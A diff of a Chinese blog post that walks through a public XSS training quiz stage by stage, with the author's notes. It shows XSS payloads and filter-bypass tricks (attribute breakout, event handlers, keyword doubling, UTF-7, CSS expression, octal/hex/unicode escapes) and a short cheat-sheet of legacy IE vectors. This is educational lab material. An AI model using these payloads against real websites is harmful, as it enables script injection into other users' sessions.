@@ -6,17 +6,21 @@ tags:
 - JavaScript
 ---
 
->这个挺有意思的，好像日本的一个学生写的，入门XSS，感觉学到了不少！
+这个挺有意思的，日本人写的，入门XSS，感觉学到了不少！
 
 # 第一关：
 >http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5
 
-	<img onerror="alert(document.domain);" src= />
+```javascript
+<img onerror="alert(document.domain);" src= />
+```
 
 or
 
-	<script>alert(document.domain);</script>
-	
+```javascript
+<script>alert(document.domain);</script>
+```
+
 <!--more-->
 
 # 第二关
@@ -24,49 +28,65 @@ or
 
 先用
 
-	<script>alert(document.domain);</script>
+```javascript
+<script>alert(document.domain);</script>
+```
 
 检查源码，发现，组成
 
-	<INPUT size=50 value="<script>alert(document.domain);</script>" name=p1>
+```javascript
+<INPUT size=50 value="<script>alert(document.domain);</script>" name=p1>
+```
 
 没有过滤，可以组合js，闭合`value=""`，进行注入！
 
-	"><script>alert(document.domain);</script><
+```javascript
+"><script>alert(document.domain);</script><
+```
 
 # 第三关
 >http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82
 
 输入：
 
-	<script>alert(document.domain);</script>
+```javascript
+<script>alert(document.domain);</script>
+```
 源码显示：
 
-	&#60;script&#62;alert(document.domain);&#60;/script&#62;
+```javascript
+&#60;script&#62;alert(document.domain);&#60;/script&#62;
+```
 
 输入框发现使用特殊字符：`<>""/ \`都被过滤了。
 打开源码，**不是审查元素**：
 
-	<form action="?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f" method="post">
-	Search a place: <input type="text" name="p1" size="30">
-	<input type="submit" value="Search"> &nbsp;
-	Choose a country: <select name="p2">
-	<option>Japan</option>
-	<option>Germany</option>
-	<option>USA</option>
-	<option>United Kingdom</option>
-	</select><hr class="red">We couldn't find any places called <b>"&lt;&gt;"</b> in <b>Japan</b>.<hr class="red"></form>
+```html
+<form action="?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f" method="post">
+Search a place: <input type="text" name="p1" size="30">
+<input type="submit" value="Search"> &nbsp;
+Choose a country: <select name="p2">
+<option>Japan</option>
+<option>Germany</option>
+<option>USA</option>
+<option>United Kingdom</option>
+</select><hr class="red">We couldn't find any places called <b>"&lt;&gt;"</b> in <b>Japan</b>.<hr class="red"></form>
+```
 
 可以看到特殊字符，被转译为`&lt;&gt;`等html字符。<br>
 卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！
 
 修改dom：
 
-	document.forms[0].p2.childNodes[1].innerHtml = '<script>alert(document.domain);</script>'
+```javascript
+document.forms[0].p2.childNodes[1].innerHtml = '<script>alert(document.domain);</script>'
+```
 
 发现innerHTML不能插入js，我需要js字符串，而不是代码，那么可以用innerText属性。
 
-	document.forms[0].p2.childNodes[1].innerText = '<script>alert(document.domain);</script>'
+```javascript
+document.forms[0].p2.childNodes[1].innerText = '<script>alert(document.domain);</script>'
+```
 
 这样，select的第一个选项已经被修改，接下来随便输入并提交，ok。
 
@@ -75,18 +95,24 @@ or
 
 此时，select和input均作了过滤，都不能进行注入，但是查看发现，有隐藏输入框，可以尝试注入。
 
-	document.forms[0].p3.value = '"><script>alert(document.domain);</script>'
+```javascript
+document.forms[0].p3.value = '"><script>alert(document.domain);</script>'
+```
 # 第五关
 
 >http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc
 
 长度限制，发现限制了文本输入长度，但只在表面上做了限制。
 	
-	document.forms[0].p1.maxlength = 100
+```javascript
+document.forms[0].p1.maxlength = 100
+```
 
 修改输入框输入内容长度限制。然后注入：
 
-	document.forms[0].p1.value = '"><script>alert(document.domain)</script><"'
+```javascript
+document.forms[0].p1.value = '"><script>alert(document.domain)</script><"'
+```
 
 # 第六关
 
@@ -97,10 +123,14 @@ or
 仍存在注入。<br>
 通过添加事件注入！<br>
 	
-	" onfocus="alert(document.domain);
+```javascript
+" onfocus="alert(document.domain);
+```
 or
 
-	" onfocus="alert(document.domain);"
+```javascript
+" onfocus="alert(document.domain);"
+```
 
 ==================Don't look boring==========================
 
@@ -108,36 +138,47 @@ Ps:<br>
 >当使用XSS时，分为三种类型:<br>
 >**A**:直接注入，可以截断属性，注入事件。
 
-	Script tags: <script src=" ;>
-	Event handler attributes: <body onload="alert('xss')">
-	CSS: <p style="background:url('javascript:alert(1)')">
-	URLs:<img src="javascript:alert('XSS')">
+```javascript
+Script tags: <script src=" ;>
+Event handler attributes: <body onload="alert('xss')">
+CSS: <p style="background:url('javascript:alert(1)')">
+URLs:<img src="javascript:alert('XSS')">
+```
 
 >**B**.Proprietary extensions to HTML private development
 私人开发专有扩展HTML，**主要是针对只支持IE浏览器的私有标签！**
-	
-	XML data islands(IE) :
-	<xml src=" ; id="x">
-	<span datasrc="#x" datafld="c" dataformatas="html">
+
+```javascript
+XML data islands(IE) :
+<xml src=" ; id="x">
+<span datasrc="#x" datafld="c" dataformatas="html">
+```
 
 XML data islands(IE)(数据岛)(<a href="http://www.w3school.com.cn/xml/xml_dont.asp">使用</a>)：
 >1.是嵌入 HTML 页面中的 XML 数据。<br>
 >2.XML 数据岛只在 Internet Explorer 浏览器中有效。<br>
-	
-	JavaScript expressions in attribute(NS4):
-	<p id="&{alert('XSS')}">
-	
-	
-	Conditional comments(IE)
-	<!--[if gte IE 4]>
-	<script>alert('XSS')</script>
-	<![endif]-->
+
+```javascript
+JavaScript expressions in attribute(NS4):
+<p id="&{alert('XSS')}">
+```
+
+
+​	
+```javascript
+Conditional comments(IE)
+<!--[if gte IE 4]>
+<script>alert('XSS')</script>
+<![endif]-->
+```
 Conditional comments(条件注释)：定义了一些通过IE执行的HTML标记
 
 # 第七关
 >http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2
 
-	" onfocus=alert(document.domain);
+```javascript
+" onfocus=alert(document.domain);
+```
 
 上面第六关还是能注入，不知道后台验证怎么处理的？
 
@@ -154,22 +195,30 @@ Conditional comments(条件注释)：定义了一些通过IE执行的HTML标记
 
 查看源码，发现提交数据时，带有一行数据编码：
 
-	<INPUT size=50 name=p1>
-	<INPUT type=hidden value=euc-jp name=charset>
+```javascript
+<INPUT size=50 name=p1>
+<INPUT type=hidden value=euc-jp name=charset>
+```
 
 可以利用了IE对于UTF-7的漏洞，过滤对于UTF-7的不支持，以及IE对于UTF-7的漏洞！
 
 ## UTF-7
 >用以将Unicode字符以ASCII编码的字符串来呈现。
 
-	<INPUT name="charset" type="hidden" value="utf-7" >
+```javascript
+<INPUT name="charset" type="hidden" value="utf-7" >
+```
 
 将
 
-	" onfocus="alert(document.domain);
+```javascript
+" onfocus="alert(document.domain);
+```
 utf-7编码为：
 
-	+ACI onfocus+AD0AIg-alert(document.domain)+ADs-
+```javascript
++ACI onfocus+AD0AIg-alert(document.domain)+ADs-
+```
 
 这个编码网站挺全的：
 
@@ -183,18 +232,24 @@ utf-7编码为：
 
 >例如他过滤了“domain”关键字，那么只要domain出现，就会被替换，那么可以在domain关键字中间再加一个，组成“dodomainmain”，这样中间的domain被过滤，剩下的部分组成domain，这样就越过了！（好机智！）
 
-	" onfocus="alert(document.dodomainmain)"
+```javascript
+" onfocus="alert(document.dodomainmain)"
+```
 
 # 第十一关：
 >http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83
 
 输入：
 
-	" onfocus="alert(document.dodomainmain)"
+```javascript
+" onfocus="alert(document.dodomainmain)"
+```
 
 查看页面源码：
 
-	<INPUT size=50 name=p1 ? onxxx="alert(document.dodomainmain)">
+```javascript
+<INPUT size=50 name=p1 ? onxxx="alert(document.dodomainmain)">
+```
 
 查看提示：
 >Hint: "s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;" 
@@ -203,33 +258,47 @@ utf-7编码为：
 ## 制表符越过
 输入：
 
-	"><a href="javascript:alert(document.domain);">XSS</a>
+```javascript
+"><a href="javascript:alert(document.domain);">XSS</a>
+```
 源码发现：
 
-	<A href="javaxscript:alert(document.domain);">XSS</A>
+```javascript
+<A href="javaxscript:alert(document.domain);">XSS</A>
+```
 加入制表符：
 
-	"><a href="javascri	p	t:alert(document.domain)";>XSS</a> //OK
+```javascript
+"><a href="javascri	p	t:alert(document.domain)";>XSS</a> //OK
+```
 
 过了！
 
 疑惑：
 为什么
 
-	" on&#x09;focus="alert(document.dodomainmain)"
+```javascript
+" on&#x09;focus="alert(document.dodomainmain)"
+```
 过不去？
 
 显示：
 
-	<INPUT size=50 name=p1 ? on&#x09;focus="alert(document.dodomainmain)">
+```javascript
+<INPUT size=50 name=p1 ? on&#x09;focus="alert(document.dodomainmain)">
+```
 
 但是，如果输入
 
-	" on&#x09;focus="al&#x09;ert(document.dodomainmain)"
+```javascript
+" on&#x09;focus="al&#x09;ert(document.dodomainmain)"
+```
 
 显示：
 
-	<INPUT size=50 name=p1 ? on&#x09;focus="al&#9;ert(document.dodomainmain)">
+```javascript
+<INPUT size=50 name=p1 ? on&#x09;focus="al&#9;ert(document.dodomainmain)">
+```
 
 这个HTML的转义应该是针对字符串的;
 
@@ -243,7 +312,9 @@ utf-7编码为：
 
 再看Hint：
 	
-	 "s/[\x00-\x20\<\>\"\']//g;" 
+```javascript
+ "s/[\x00-\x20\<\>\"\']//g;" 
+```
 
 `x00~x20`都被过滤，制表符无法使用了！，同样，`<> "  '`都被滤了！
 
@@ -255,7 +326,9 @@ IE对于反单引号没有很好的过滤，使用  \`\`  可以很轻松的截�
 
 可以截断输入，那就好办了！
 
-	`` onfocus="alert(document.domain);"  //IE下可行
+```javascript
+`` onfocus="alert(document.domain);"  //IE下可行
+```
 
 # 第十三关
 
@@ -266,7 +339,9 @@ IE对于反单引号没有很好的过滤，使用  \`\`  可以很轻松的截�
 **说明这个expression是一个浏览器兼容性的问题**，解决这类兼容性xss漏洞，使用ie6即以下，效果可能更好！<br>
 附答案：
 
-	aa:expression(onfocus = function(){alert(document.domain)})
+```javascript
+aa:expression(onfocus = function(){alert(document.domain)})
+```
 
 >在CSS样式中注入这段代码就能弹了。。<br>
 >但是现实环境中怎么可能有如此简单就能插入的地方。。<br>
@@ -276,15 +351,19 @@ IE对于反单引号没有很好的过滤，使用  \`\`  可以很轻松的截�
 
 (1)@import 和 expression<br>
 
-	@import "http://web/xss.css"  
-	@import 'javascript:alert("xss")'  
-	body{xss:expression(alert('xss'))]  
-	<img style="xss:expression(alert('xss'))">  
+```javascript
+@import "http://web/xss.css"  
+@import 'javascript:alert("xss")'  
+body{xss:expression(alert('xss'))]  
+<img style="xss:expression(alert('xss'))">  
+```
 
 (2)css代码中js，vs脚本
 
-	body{backgroud-image:url(javascript:alert('xss'))}  
-	body{backgroud-image:url(vbscript:msgbox('xss'))} 
+```javascript
+body{backgroud-image:url(javascript:alert('xss'))}  
+body{backgroud-image:url(vbscript:msgbox('xss'))} 
+```
 
 # 第十四关
 
@@ -294,26 +373,38 @@ IE对于反单引号没有很好的过滤，使用  \`\`  可以很轻松的截�
 
 1.编码绕过
 
-	aa:\0065xpression(onfocus = function(){alert(document.domain)}) ERROR
+```javascript
+aa:\0065xpression(onfocus = function(){alert(document.domain)}) ERROR
+```
 
 2.`\` 绕过
 
-	aa:e\xpression(onfocus = function(){alert(document.domain)}) ERROR
+```javascript
+aa:e\xpression(onfocus = function(){alert(document.domain)}) ERROR
+```
 
 3.`\0` 绕过
 
-	aa:e\0xpression(onfocus = function(){alert(document.domain)}) ok
+```javascript
+aa:e\0xpression(onfocus = function(){alert(document.domain)}) ok
+```
 
 4.`\**\`绕过
 	
-	aa:e\**\xpression(onfocus = function(){alert(document.domain)}) ERROR
+
+```javascript
+aa:e\**\xpression(onfocus = function(){alert(document.domain)}) ERROR
+```
 
 5.`/**/`绕过
 >好像是注解绕过
 
-	aa:e/**/xpression(onfocus = function(){alert(document.domain)}) ok
+```javascript
+aa:e/**/xpression(onfocus = function(){alert(document.domain)}) ok
+```
 
   
+
 **<font color="orange">`\uxxxx`这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 `\u5c0f` 表示汉语中的 '小'字，转换成10进制就是9215，所以在byte数组中应该是1592.</font>**
 
 # 第十五关
@@ -321,11 +412,15 @@ IE对于反单引号没有很好的过滤，使用  \`\`  可以很轻松的截�
 
 输入：
 
-	<script>alert(document.domain)</script>
+```javascript
+<script>alert(document.domain)</script>
+```
 
 源码查看，不是审查元素
 
-	<script>document.write("&lt;script&gt;alert(document.domain)&lt;/script&gt;");</script>
+```javascript
+<script>document.write("&lt;script&gt;alert(document.domain)&lt;/script&gt;");</script>
+```
 
 可以看到 `< > `这两个字符被替换为`"&lt;`和`&gt`;，说明有过滤！
 
@@ -333,16 +428,22 @@ IE对于反单引号没有很好的过滤，使用  \`\`  可以很轻松的截�
 
 控制台
 
-	alert("\u003c") //显示符号 <
-	\u0061lert("123") //123
+```javascript
+alert("\u003c") //显示符号 <
+\u0061lert("123") //123
+```
 
 JS支持这种写法，此处注入：
 
-	\\74script\\76alert(document.domain);\\74/script\\76
+```javascript
+\\74script\\76alert(document.domain);\\74/script\\76
+```
 
 能成功的原因在于使用：
 
-	document.write();
+```javascript
+document.write();
+```
 
 执行了js，将字符串编译了！
 
@@ -354,26 +455,37 @@ JS支持这种写法，此处注入：
 
 八进制（`\`+八进制）
 
-	\74script\76alert(document.domain);\74/script\76
+```javascript
+\74script\76alert(document.domain);\74/script\76
+```
 
 十六进制
 	
-	\x3cscript\x3ealert(document.domain);\x3c/script\x3e
+```javascript
+\x3cscript\x3ealert(document.domain);\x3c/script\x3e
+```
 
 发现过滤了单个 `\`
 
 Octonary：
 
-	\\74script\\76alert(document.domain);\\74/script\\76
+```javascript
+\\74script\\76alert(document.domain);\\74/script\\76
+```
 
 Hexadecimal
 
-	\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
+```javascript
+\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
+```
 
 **Unicode**好像也可以！
+
 >`\u` 加 4个16进制字符表示一个字符的编码
 
-	\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+```javascript
+\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+```
 
 # 十六关
 
@@ -381,9 +493,11 @@ Hexadecimal
 
 过滤了十六进制，我们还有八进制和unicode
 
-	\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+```javascript
+\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
 
-	\\74script\\76alert(document.domain);\\74/script\\76
+\\74script\\76alert(document.domain);\\74/script\\76
+```
 
 
 ## 第十七十八（UNSOLVED）
